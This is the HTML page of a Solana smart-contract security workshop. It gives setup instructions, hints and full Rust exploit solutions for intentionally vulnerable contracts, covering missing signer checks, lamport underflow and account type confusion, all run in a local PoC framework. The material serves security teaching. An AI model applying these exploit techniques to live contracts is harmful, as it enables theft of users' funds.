<!DOCTYPE HTML>
<html lang="en" class="sidebar-visible no-js navy">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Solana Security Workshop</title>
        <meta name="robots" content="noindex" />


        <!-- Custom HTML head -->

        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff" />

        <link rel="icon" href="favicon.svg">
        <link rel="shortcut icon" href="favicon.png">
        <link rel="stylesheet" href="css/variables.css">
        <link rel="stylesheet" href="css/general.css">
        <link rel="stylesheet" href="css/chrome.css">
        <link rel="stylesheet" href="css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="highlight.css">
        <link rel="stylesheet" href="tomorrow-night.css">
        <link rel="stylesheet" href="ayu-highlight.css">

        <!-- Custom theme stylesheets -->

    </head>
    <body>
        <!-- Provide site root to javascript -->
        <script type="text/javascript">
            var path_to_root = "";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "navy";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script type="text/javascript">
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script type="text/javascript">
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('navy')
            html.classList.add(theme);
            html.classList.add('js');
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script type="text/javascript">
            var html = document.querySelector('html');
            var sidebar = 'hidden';
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="chapter-item expanded "><a href="index.html"><strong aria-hidden="true">1.</strong> Introduction</a></li><li class="chapter-item expanded "><a href="workshop.html"><strong aria-hidden="true">2.</strong> Workshop</a></li><li class="chapter-item expanded "><a href="setup.html"><strong aria-hidden="true">3.</strong> Setup</a></li><li class="chapter-item expanded "><a href="poc_framework.html"><strong aria-hidden="true">4.</strong> PoC Framework</a></li><li class="chapter-item expanded "><a href="level0.html"><strong aria-hidden="true">5.</strong> Level 0 - A first vulnerability Presentation</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="level0-solution.html"><strong aria-hidden="true">5.1.</strong> Solution</a></li></ol></li><li class="chapter-item expanded "><a href="level1.html"><strong aria-hidden="true">6.</strong> Level 1 - Personal Vault</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="level1-hint1.html"><strong aria-hidden="true">6.1.</strong> Hint 1</a></li><li class="chapter-item expanded "><a href="level1-hint2.html"><strong aria-hidden="true">6.2.</strong> Hint 2</a></li><li class="chapter-item expanded "><a href="level1-bug.html"><strong aria-hidden="true">6.3.</strong> Bug</a></li><li class="chapter-item expanded "><a href="level1-solution.html"><strong aria-hidden="true">6.4.</strong> Solution</a></li></ol></li><li class="chapter-item expanded "><a href="level2.html"><strong aria-hidden="true">7.</strong> Level 2 - Secure Personal Vault</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="level2-solution.html"><strong aria-hidden="true">7.1.</strong> Solution</a></li></ol></li><li class="chapter-item expanded "><a href="level3.html"><strong aria-hidden="true">8.</strong> Level 3 - Tip Pool</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="level2-hint1.html"><strong aria-hidden="true">8.1.</strong> Hint 1</a></li><li class="chapter-item expanded "><a href="level2-hint2.html"><strong aria-hidden="true">8.2.</strong> Hint 2</a></li><li class="chapter-item expanded "><a href="level3-solution.html"><strong aria-hidden="true">8.3.</strong> Solution</a></li></ol></li><li class="chapter-item expanded "><a href="level4.html"><strong aria-hidden="true">9.</strong> Level 4 - SPL-Token Vault</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="level4-hint1.html"><strong aria-hidden="true">9.1.</strong> Hint 1</a></li><li class="chapter-item expanded "><a href="level4-hint2.html"><strong aria-hidden="true">9.2.</strong> Hint 2</a></li><li class="chapter-item expanded "><a href="level4-hint3.html"><strong aria-hidden="true">9.3.</strong> Hint 3</a></li><li class="chapter-item expanded "><a href="level4-bug.html"><strong aria-hidden="true">9.4.</strong> Bug</a></li><li class="chapter-item expanded "><a href="level4-solution.html"><strong aria-hidden="true">9.5.</strong> Solution</a></li></ol></li><li class="chapter-item expanded "><a href="resources.html">Resources</a></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky bordered">
                    <div class="left-buttons">
                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </button>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy (default)</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title">Solana Security Workshop</h1>

                    <div class="right-buttons">
                        <a href="print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>
                        <a href="https://github.com/neodyme-labs/neodyme-breakpoint-workshop" title="Git repository" aria-label="Git repository">
                            <i id="git-repository-button" class="fa fa-github"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script type="text/javascript">
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="introduction"><a class="header" href="#introduction">Introduction</a></h1>
<p>Welcome to the Solana Security Workshop!
Here, we'll look at Solana Smart Contracts from an attacker's perspective.
By learning how to find and exploit different types of issues, you'll be able to write more secure contracts as you'll know what to watch out for.</p>
<p>In the first part of the course, we'll introduce concepts relevant to the security of Solana Contracts and explore one vulnerability in detail.
After this part, we've prepared several smart contracts as challenges.
Each of these will illustrate a different Solana smart contract bug.
You're encouraged to work on exploiting these on your own. If you get stuck, please ask questions, we love to help. If you are attending remotely, this book will also provide some hints, which we recommend you read only if you don't progress yourself.</p>
<p>Much code you'll see during this workshop is intentionally vulnerable. Even if the bugs are fixed, the code does not follow good design guidelines. Please do all of us a favor and not use it outside of security demonstrations.</p>
<h2 id="requirements"><a class="header" href="#requirements">Requirements</a></h2>
<p>To follow along with this course, you need to be familiar with writing solana contracts and the <a href="https://rust-lang.org/">Rust</a> programming language.</p>
<p>You'll also need an environment where you can compile the example contracts and run the attacks.
We have prepared remote environments if you need them, for details, see <a href="setup.html">Setup</a>.</p>
<h2 id="who-we-are"><a class="header" href="#who-we-are">Who We Are</a></h2>
<p>We started as a group of independent researchers, who love digging into complex concepts and projects. At the end of 2020 we have been introduced into the Solana ecosystem by looking at Solana-core code, in which we have found a number of vulnerabilities. We have since founded the security-research firm <a href="https://neodyme.io">Neodyme</a>, which has been helping the Solana Foundation with peer-reviews of smart contracts.</p>
<p>As such, we have found lots of interesting and critical bugs in smart contracts.
To help make the Ecosystem a more secure place, we want to share what we can in this short 3h workshop. We hope you enjoy breaking our prepared contracts as much as we do.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="workshop"><a class="header" href="#workshop">Workshop</a></h1>
<p>To make this workshop hands-on, you will find bugs and develop exploits for them yourself.</p>
<p>We have prepared a few vulnerable Solana contracts.
As this workshop is only 3h long, we have simplified bugs we have found in the wild a lot.
This allows you to focus on finding and exploiting bugs over reverse-engineering functionality.</p>
<p>In the same vein, we have opted not to use the Anchor framework in our contracts, even though it usually leads to more secure contracts.
This is simply to save the extra time you'd need to learn anchor if you are not familiar yet.
The security fundamentals you learn here will apply just as well in anchor, they'll just be a bit easier to implement cleanly there.</p>
<p>In anchor, lots of checks are hidden away, and we often have to go diggin in anchor source to understand what exactly is being checked and what can be controlled. (have not found a bug inside anchor itself though... yet)</p>
<p>Each task can be solved without looking at the description here. But we have prepared some hints to help you.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="setup"><a class="header" href="#setup">Setup</a></h1>
<p>To be able to write exploits, you need an appropriate development-environment.
If you have developed Solana contracts on your device before, feel free to just use your existing setup.</p>
<p>Depending on how comfortable you are with your current environment, there are three options:</p>
<ul>
<li>Fully provided development: You pull and start a docker container we provided. In there you can find a VS-Code instance, which you can access via the browser. This is the easiest to get going with, but some keybinds might be weird.</li>
<li>Fully local development: You checkout out git-repo and go from there. Recommended for experienced devs, most difficult to setup.</li>
<li>Mixed development: Still get the benefits of a local VS-Code (your settings, all shortcuts), without having to install all dependencies. Also requires some local setup.</li>
</ul>
<p>Should you have one of the new M1 Macs, you are unfortunately out of luck. This is because Solana's rBPF-JIT is not supported there, and we currently have no way of disabling it in our setup.</p>
<h2 id="easy-option-full-setup"><a class="header" href="#easy-option-full-setup">Easy Option: Full Setup</a></h2>
<p>We have provided a full docker image with all you need.</p>
<ol>
<li>Install docker</li>
<li><code>docker run --name breakpoint-workshop -p 2222:22 -p 8080:80 -e PASSWORD=&quot;password&quot; neodymelabs/breakpoint-workshop:latest-code-prebuilt</code></li>
</ol>
<p>The container runs a headless instance of VS-Code, setup with rust-analyzer. To access it, go to <code>http://127.0.0.1:8080</code> and enter your password (<code>password</code>).</p>
<p>If you are using Chrome, the usual VS-Code shortcuts will work. Firefox is a bit more restrictive, and you might have to use the menu instead of some shortcuts.</p>
<p>To get a terminal on the server, you can either use ssh, or simply use VS-Code's build-in terminal (Open with either <code>Ctrl+Shift+`</code>, or <code>Menu-&gt;View-&gt;Terminal</code>). The workspace is located at <code>/work</code>.
To ssh use this command <code>ssh user@127.0.0.1 -p 2222</code> and type in the password as before.</p>
<p>Go-to-definition can be done with <code>Ctrl+Left Mouse Button</code>, going back with <code>Ctrl+Alt+Minus</code></p>
<h2 id="flexible-option-local-setup"><a class="header" href="#flexible-option-local-setup">Flexible Option: Local Setup</a></h2>
<p>For the local setup, you'll need to fetch our prepared contracts and exploit-harnesses at <a href="https://github.com/neodyme-labs/neodyme-breakpoint-workshop">Github</a>. In addition, you'll need an up-to-date version of Rust. Should you wish to render these docs locally, you can do so with mdbook: </p>
<pre><code>cargo install mdbook
mdbook serve
</code></pre>
<p>If you encounter the error</p>
<pre><code>error: failed to download `solana-frozen-abi v1.8.2`
</code></pre>
<p>or</p>
<pre><code>thread 'main' panicked at 'called `Result::unwrap()` on an `Err` value: Os { code: 2, kind: NotFound, message: &quot;No such file or directory&quot; }', /home/user/.cargo/registry/src/github.com-1ecc6299db9ec823/poc-framework-0.1.2/src/lib.rs:522:81
</code></pre>
<p>then the contract failed to build. This is likely caused by a too old rust or solana-toolchain. Ensure you have the latest versions by running:</p>
<pre><code class="language-sh">rustup default stable
rustup update
solana-install init 1.7.17
</code></pre>
<h2 id="third-option-combined-setup"><a class="header" href="#third-option-combined-setup">Third Option: Combined Setup</a></h2>
<p>It is possible to use the container with VS-Code via the <a href="https://marketplace.visualstudio.com/items?itemName=ms-vscode-remote.vscode-remote-extensionpack">Remote Development</a> extension. Unfortunately, this extension is only available for the original microsoft binary builds, and not open-source builds of VSCode.</p>
<ol>
<li>Install docker</li>
<li><code>docker run --name breakpoint-workshop -p 2222:22 -p 8080:80 -e PASSWORD=&quot;password&quot; neodymelabs/breakpoint-workshop:latest-code-prebuilt</code></li>
<li>Open VS-Code</li>
<li>Install the Remote Development extension (<code>Remote - SSH</code>), if not installed already</li>
<li>Press <code>Ctrl+Shift+P</code> to open the command palette.</li>
<li>Enter <code>Remote-SSH: Connect to Host...</code></li>
<li>Enter the user and address of your assigned instance, eg <code>user@127.0.0.1:2222</code></li>
<li>Enter your password when prompted</li>
<li>Open a terminal (on the remote)</li>
<li>Terminate the connection and reconnect via VSCode</li>
<li>Click <code>Open Folder</code> and open the workspace at <code>/work</code></li>
<li>The workspace will open. You'll operate on the same files as you would via the fully-remote setup.</li>
<li>Install the Rust-Analyzer extension on the remote.</li>
</ol>
<h2 id="compiling-the-contracts-and-running-the-exploits"><a class="header" href="#compiling-the-contracts-and-running-the-exploits">Compiling the contracts and running the exploits</a></h2>
<p>We provide five contracts and five exploit harnesses, all in the same cargo workspace. As they all use the same dependencies, we can save disk space and compile-time that way.
Each contract is in its own crate (<code>level0 - level4</code>). For the exploits, we have pre-setup harnesses using our PoC-Framework contained in the <code>pocs</code> folder, though more on that later.</p>
<p>To make compiling and running the exploits painless, especially on the remote instances, we have provided pre-configured build targets in VS-Code. To compile and run an exploit, you can press <code>Ctrl+Shift+B</code> and then select the exploit you are working on.</p>
<p>In the VS-Code based workflow, all contracts are rebuild automatically whenever you run an exploit. You can also trigger this rebuilding manually by selecting the <code>build contracts</code> option in VS-Code's build menu.</p>
<p>If you don't want to use this workflow, you have to rebuild the contracts yourself whenever you change something (for example introducing logging).</p>
<p>Compiling and running the old-fashioned way via terminal is possible as well. Each exploit complies to its own binary, which you can select via the <code>--bin</code> argument for cargo:</p>
<pre><code class="language-sh"># compile all contracts
cargo build-bpf --workspace

# run level3 exploit
RUST_BACKTRACE=1 cargo run --bin level3
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="poc-framework"><a class="header" href="#poc-framework">PoC Framework</a></h1>
<p>The so called <code>PoC-Framework</code> is a tool we developed to help us quickly testing bugs in smart-contracts.
Especially for more complicated bugs, it is often easier to verify an idea practically rather than statically by just reading code.</p>
<p>This is usually a multistep process. First, you obviously do not want to test on the live Solana chain.
That means you have to replicate the setup locally somehow. If you have ever tried to write integration-tests for smart-contracts before, you'll know that it is a bit annoying to get the correct setup.</p>
<p>For normal contract usage, you'd have a Rust cli or some web3js that generates instructions and send them via RPC to a validator. On the validator, the contract is already initialized, and your instructions can be executed by the network, returning you the result.</p>
<p>For testing, it is often times not necessary to have a full network. Just the solana smart-contract runtime is enough to see most behaviour.</p>
<p>This is where the <code>PoC-Framework</code> comes in. It is a collection of helper methods to interact with the core solana code in a way that is similar to what would happen when a contract is used on the normal network.</p>
<p>An exploit utilizing the framework consists of three parts: setup code (marked with the comment: &quot;SETUP CODE BELOW&quot;), the actual exploit (the <code>fn hack()</code> function you will write) and a check if the exploit succeeded (the <code>fn verify()</code> function). We have already provided the first and the last one in the poc files for you, just the exploit is missing.</p>
<p>To see how the Framework can help you, its best to check out the functions provided by the <code>Environment</code>: <a href="https://docs.rs/poc-framework/0.1.2/poc_framework/trait.Environment.html">poc_framework::Environment docs</a></p>
<h2 id="exploit-outline"><a class="header" href="#exploit-outline">Exploit outline</a></h2>
<ul>
<li>hacker is a key with 1 sol for paying fees n stuff.</li>
<li>GOAL: give this hacker more money than he started with. Does not necessarily have to be all the money, just more.</li>
<li><code>fn verify()</code> will check this for you automatically, so you know when you have succeeded.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><p>This is the presentation we held at Breakpoint 2021. We explained the basics of level 0 and how to exploit it. You can watch the presentation on YouTube and follow along in the presentation. </p>
<iframe width="560" height="315" src="https://www.youtube-nocookie.com/embed/vbkhhgeP30I" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen style="display: block; margin:auto; padding-bottom: 10px;"></iframe>
<object data="Presentation_neodyme.pdf" type="application/pdf" width="100%" height="500px">
    <embed src="Presentation_neodyme.pdf">
        <p>This browser does not support PDFs. Please download the PDF to view it: <a href="Presentation_neodyme.pdf">Download PDF</a>.</p>
    </embed>
</object><div style="break-before: page; page-break-before: always;"></div><h1 id="solution"><a class="header" href="#solution">Solution</a></h1>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use borsh::BorshSerialize;
use level0::{Wallet, WalletInstruction};
use solana_program::instruction::{AccountMeta, Instruction};

fn hack(env: &amp;mut LocalEnvironment, challenge: &amp;Challenge) {
    // Figure out how much we want to steal
    let amount = env.get_account(challenge.vault_address).unwrap().lamports;
    println!(&quot;Trying to steal {} lamports&quot;, amount.green());

    // Create a fake Wallet pointing to the real vault
    let hack_wallet = Wallet {
        authority: challenge.hacker.pubkey(),
        vault: challenge.vault_address,
    };

    let fake_wallet = keypair(123);
    let mut hack_wallet_data: Vec&lt;u8&gt; = vec![];

    hack_wallet.serialize(&amp;mut hack_wallet_data).unwrap();

    env.create_account_with_data(&amp;fake_wallet, hack_wallet_data);

    env.execute_as_transaction(
        &amp;[Instruction {
            program_id: challenge.wallet_program,
            accounts: vec![
                AccountMeta::new(fake_wallet.pubkey(), false),
                AccountMeta::new(challenge.vault_address, false),
                AccountMeta::new(challenge.hacker.pubkey(), true),
                AccountMeta::new(challenge.hacker.pubkey(), false),
                AccountMeta::new_readonly(system_program::id(), false),
            ],
            data: WalletInstruction::Withdraw { amount }.try_to_vec().unwrap(),
        }],
        &amp;[&amp;challenge.hacker],
    )
    .print();
}

<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="level-1---personal-vault"><a class="header" href="#level-1---personal-vault">Level 1 - Personal Vault</a></h1>
<p>Let's get ready to write your first own exploit. 
In this level, we've simplified the contract from Level 0 a bit - there's no shared vault anymore, the contract only manages personal vaults.
The functionality is still the same: after initializing your account, you can deposit and withdraw SOL from this account.</p>
<p>Each personal wallet account has an authority. This authority is stored in the account data struct:</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub struct Wallet {
    pub authority: Pubkey
}
<span class="boring">}
</span></code></pre></pre>
<p>Only the authority should be able to withdraw funds from a wallet. Can you break this?</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="hint-1"><a class="header" href="#hint-1">Hint 1</a></h1>
<p>Look closely at the <code>withdraw</code> function.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="hint-2"><a class="header" href="#hint-2">Hint 2</a></h1>
<p>How is the identity of the authority checked?</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="bug"><a class="header" href="#bug">Bug</a></h1>
<p>The <code>withdraw</code> function does not check that the <code>authority</code> has signed. Now, can you exploit this?</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="solution---missing-signer-check"><a class="header" href="#solution---missing-signer-check">Solution - Missing signer check</a></h1>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use borsh::BorshSerialize;
use level1::WalletInstruction;
use solana_program::instruction::{AccountMeta, Instruction};

fn hack(env: &amp;mut LocalEnvironment, challenge: &amp;Challenge) {
    let tx = env.execute_as_transaction(
        // we construct the instruction manually here
        // because the level1::withdraw function sets the is_signer flag on the authority
        // but we don't want to sign 
        &amp;[Instruction {
            program_id: challenge.wallet_program,
            accounts: vec![
                AccountMeta::new(challenge.wallet_address, false),
                AccountMeta::new(challenge.wallet_authority, false),
                AccountMeta::new(challenge.hacker.pubkey(), true),
                AccountMeta::new_readonly(system_program::id(), false),
            ],
            data: WalletInstruction::Withdraw { amount: sol_to_lamports(1.0) }.try_to_vec().unwrap(),
        }],
        &amp;[&amp;challenge.hacker],
    );
    tx.print_named(&quot;haxx&quot;);
}
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="level-2---secure-personal-vault"><a class="header" href="#level-2---secure-personal-vault">Level 2 - Secure Personal Vault</a></h1>
<p>Now that this missing signer check is fixed, the contract looks really secure... but I wonder, if you can still break it?</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="solution---overflowunderflow"><a class="header" href="#solution---overflowunderflow">Solution - Overflow/Underflow</a></h1>
<p>The vulnerability in this contract is an overflow/underflow in the deposit function:</p>
<pre><code class="language-rs">    **wallet_info.lamports.borrow_mut() -= amount;
    **destination_info.lamports.borrow_mut() += amount;
</code></pre>
<p>For a large <code>amount</code> the <code>u64</code> lamports overflow/underflow. If an attacker sets <code>wallet_info</code> to the hackers-wallet and <code>destination_info</code> to the rich-boi-wallet, he can underflow the <code>wallet_info</code> and therefore increase his lamports. On the other hand he can overflow the <code>destination_info</code> and therefore decrease the destination lamports. 
See https://play.rust-lang.org/?version=stable&amp;mode=release&amp;edition=2021&amp;gist=c446a40de01a3af7957817ebe199237a</p>
<p>There is one more trick to it, as there is a rent check: </p>
<pre><code class="language-rs">    let min_balance = rent.minimum_balance(WALLET_LEN as usize);
    if min_balance + amount &gt; **wallet_info.lamports.borrow_mut() {
        return Err(ProgramError::InsufficientFunds);
    }
</code></pre>
<p>But this only limits the maximum amount stolen per iteration to min_balance lamports.</p>
<p>example solution by Thomas:</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use borsh::BorshSerialize;
use level2::{WalletInstruction, get_wallet_address};
use solana_program::instruction::{AccountMeta, Instruction};
use solana_program::rent::Rent;
use solana_program::sysvar;



fn hack(env: &amp;mut LocalEnvironment, challenge: &amp;Challenge) {
    // create hackers wallet
    assert_tx_success(env.execute_as_transaction(
        &amp;[level2::initialize(
            challenge.wallet_program,
            challenge.hacker.pubkey(),
        )],
        &amp;[&amp;challenge.hacker],
    ));

    let hacker_wallet = get_wallet_address(challenge.hacker.pubkey(), challenge.wallet_program);

    let to_transfer = Rent::default().minimum_balance(8);
    println!(&quot;To transfer: {}&quot;, to_transfer);
    //let to_transfer = 1_000_000u64;
    let overflow = (-(to_transfer as i64)) as u64;

    let iters = 10;

    for i in 0..iters {
        let tx = env.execute_as_transaction(
            &amp;[Instruction {
                program_id: challenge.wallet_program,
                accounts: vec![
                    AccountMeta::new(hacker_wallet, false),              // source wallet
                    AccountMeta::new(challenge.hacker.pubkey(), true),   // owner
                    AccountMeta::new(challenge.wallet_address, false),   // target wallet
                    AccountMeta::new_readonly(sysvar::rent::id(), false), // rent
                ],
                data: WalletInstruction::Withdraw { amount: overflow+i }.try_to_vec().unwrap(),
            }],
            &amp;[&amp;challenge.hacker],
        );
        tx.print_named(&amp;format!(&quot;haxx {}&quot;, i));
    }
    

    let tx = env.execute_as_transaction(
        &amp;[Instruction {
            program_id: challenge.wallet_program,
            accounts: vec![
                AccountMeta::new(hacker_wallet, false),              // source wallet
                AccountMeta::new(challenge.hacker.pubkey(), true),   // owner
                AccountMeta::new(challenge.hacker.pubkey(), false),  // target wallet
                AccountMeta::new_readonly(sysvar::rent::id(), false), // rent
            ],
            data: WalletInstruction::Withdraw { amount: to_transfer*iters-1000 }.try_to_vec().unwrap(),
        }],
        &amp;[&amp;challenge.hacker],
    );
    tx.print_named(&quot;hacker withdraw&quot;);
}
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="level-3---tip-pool"><a class="header" href="#level-3---tip-pool">Level 3 - Tip Pool</a></h1>
<h1 id="usage"><a class="header" href="#usage">Usage</a></h1>
<p>Ever needed an easy and secure way to tip people? This contract will solve all your donation problems: The operator creates vault, everyone who wants can then create a pool for their personal donation account. For tax-reasons all funds are stored centrally, you can just withdraw the desired amount whenever you need them, and pay taxes at that point.</p>
<h1 id="example-flow"><a class="header" href="#example-flow">Example Flow</a></h1>
<ul>
<li>Initialize the contract</li>
<li>Create a pool</li>
<li>Tip to the pool</li>
<li>Withdraw from the pool</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="hint-1-1"><a class="header" href="#hint-1-1">Hint 1</a></h1>
<p>Huge numbers make huge problems</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="hint-2-1"><a class="header" href="#hint-2-1">Hint 2</a></h1>
<p>How could you turn the source into the destination?</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="solution---account-confusion"><a class="header" href="#solution---account-confusion">Solution - Account confusion</a></h1>
<p>The vulnerability in this contract is called account-confusion. Outside of the solana contract this type of vulnerability is called <em>type confusion</em>. It happens whenever data is misinterpreted. Programs often have to rely on a certain data structure, often a user can not control the data directly for a certain type, but for another one. If a program has a type confusion bug, it expects, that the data cannot be user controlled, but it fails to check the type, therefore a malicious attacker trick the program to use the controlled data instead. For example in this instance an attacker can initialize a second vault and use the withdraw instruction with the vault account as a pool account.</p>
<p>In this case, we confuse a <code>TipPool</code> with a <code>Vault</code>. The fields will overlap nicely:</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub struct TipPool {
    pub withdraw_authority: Pubkey, // at the same position as Vault::creator
    pub value: u64,                 // at the same position as Vault::fee
    pub vault: Pubkey,              // at the same position as Vault::fee_recipient
}

pub struct Vault {
    pub creator: Pubkey,
    pub fee: f64,              
    pub fee_recipient: Pubkey,
    pub seed: u8,
}
<span class="boring">}
</span></code></pre></pre>
<p>Another thing that may be tricky to wrap your head around is that the program can be initialized twice, PDAs can be derived by a different seed result in different addresses, while in this case this is totally intended, there can be some cases, where not knowing this can lead to serious vulnerabilities.</p>
<p>example solution by Felipe (author):</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>fn hack(env: &amp;mut LocalEnvironment, challenge: &amp;Challenge) {
    let seed: u8 = 1;
    let hacker_vault_address =
        Pubkey::create_program_address(&amp;[&amp;[seed]], &amp;challenge.tip_program).unwrap();

    env.execute_as_transaction(
        &amp;[level3::initialize(
            challenge.tip_program,
            hacker_vault_address,      // new vault's address
            challenge.hacker.pubkey(), // initializer_address. Aliases with TipPool::withdraw_authority
            seed,                      // seed != original seed, so we can create an account
            2.0,                       // some fee. Aliases with TipPool::amount (note u64 != f64. Any value &gt;1.0 is a huge u64)
            challenge.vault_address,   // fee_recipient. Aliases with TipPool::vault
        )],
        &amp;[&amp;challenge.hacker],
    )
    .print();

    let amount = env.get_account(challenge.vault_address).unwrap().lamports;

    env.execute_as_transaction(
        &amp;[level3::withdraw(
            challenge.tip_program,
            challenge.vault_address,
            hacker_vault_address,
            challenge.hacker.pubkey(),
            amount,
        )],
        &amp;[&amp;challenge.hacker],
    )
    .print();
}
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="level-4"><a class="header" href="#level-4">Level 4</a></h1>
<p>All the personal vaults we've seen so far only can only store SOL. 
Level 4 now implements a vault for arbitrary SPL tokens, the standard token implementation on Solana.</p>
<p>For each user, the contract manages an SPL token account, to which deposits can be made.
The account is derived from the user's address, and only this user should be able to withdraw the tokens again. </p>
<p>Can you spot the bug, and steal the tokens from the wallet?</p>
<p>Note: this bug is a bit sneaky, so don't feel bad if you don't spot it right away!</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="hint-1-2"><a class="header" href="#hint-1-2">Hint 1</a></h1>
<p>Take a look at <code>Cargo.toml</code>. We had to use spl-token version 3.1.0, since the bug is not exploitable with spl-token version 3.1.1 and above.
It might be wise to take a look at the changes between those two versions.</p>
<details>
  <summary>Sub-hint: How to diff these versions?</summary>
  Unfortunately, SPL-token is inside a monorepo. This makes diffing via GitHub's web-ui near impossible.
  You can however look at all recent commits to the SPL-token program by opening the folder and clicking <a href="https://github.com/solana-labs/solana-program-library/commits/master/token/program/src">History</a>
<p>To diff every file in SPL-Token via the CLI, you could clone the solana-program-library repo, and then run <code>git diff token-v3.1.0 token-v3.1.1 -- token/program/src</code></p>
</details>
<div style="break-before: page; page-break-before: always;"></div><h1 id="hint-2-2"><a class="header" href="#hint-2-2">Hint 2</a></h1>
<p>You need to write your own contract to exploit this bug. We've already prepared a skeleton for you at the path <code>level4-poc-contract</code>.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="hint-3"><a class="header" href="#hint-3">Hint 3</a></h1>
